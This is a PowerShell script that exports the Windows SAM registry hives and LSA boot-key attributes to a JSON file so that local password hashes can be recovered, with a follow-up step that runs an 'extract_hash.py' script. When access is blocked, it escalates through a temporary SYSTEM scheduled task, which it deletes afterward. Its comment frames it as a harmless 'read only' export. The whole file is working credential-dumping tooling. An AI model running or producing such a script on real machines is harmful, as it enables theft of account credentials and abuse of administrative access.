#Requires -RunAsAdministrator
<#
One-time SAM blob export (READ ONLY).

Not a logon, not an authentication, not a password change. It just reads:
  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data}  (class attrs)
  HKLM\SAM\SAM\Domains\Account\{F,V} and ...\Users\<RID>\V
and saves them to sam_dump.json next to this script.

Tries the current elevated session first; if the SAM ACL still blocks it,
retries once through a temporary SYSTEM scheduled task (deleted afterwards).
#>
$ErrorActionPreference = 'Stop'

$collector = Join-Path $PSScriptRoot 'collect_blobs.ps1'
$finalOut  = Join-Path $PSScriptRoot 'sam_dump.json'
$tmpOut    = Join-Path $env:TEMP 'sam_dump_blobs.json'
$tmpLog    = Join-Path $env:TEMP 'sam_dump_blobs.log'
$taskName  = 'SamBlobExportTmp'

if (-not (Test-Path -LiteralPath $collector)) { throw "Missing collector: $collector" }

Remove-Item -LiteralPath $tmpOut -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath $tmpLog -Force -ErrorAction SilentlyContinue

Write-Output "Attempt 1/2: current elevated session..."
& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $collector -Out $tmpOut -Log $tmpLog

if (-not (Test-Path -LiteralPath $tmpOut)) {
    Write-Output "Attempt 2/2: temporary SYSTEM task..."
    $action    = New-ScheduledTaskAction -Execute 'powershell.exe' `
        -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$collector`" -Out `"$tmpOut`" -Log `"$tmpLog`""
    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Force | Out-Null
    try {
        Start-ScheduledTask -TaskName $taskName
        $deadline = (Get-Date).AddSeconds(60)
        while (-not (Test-Path -LiteralPath $tmpOut) -and (Get-Date) -lt $deadline) {
            Start-Sleep -Milliseconds 500
        }
    }
    finally {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }
}

if (Test-Path -LiteralPath $tmpOut) {
    Copy-Item -LiteralPath $tmpOut -Destination $finalOut -Force
    Remove-Item -LiteralPath $tmpOut -Force -ErrorAction SilentlyContinue
    Write-Output ""
    Write-Output "OK -> $finalOut"
    Write-Output "Next: python `"$PSScriptRoot\extract_hash.py`" --user $env:USERNAME"
    exit 0
}

Write-Output ""
Write-Output "FAILED. Recent log from $tmpLog :"
if (Test-Path -LiteralPath $tmpLog) { Get-Content -LiteralPath $tmpLog } else { Write-Output "(no log written)" }
Write-Output ""
Write-Output "Send me that log and I will adjust the collector."
exit 1
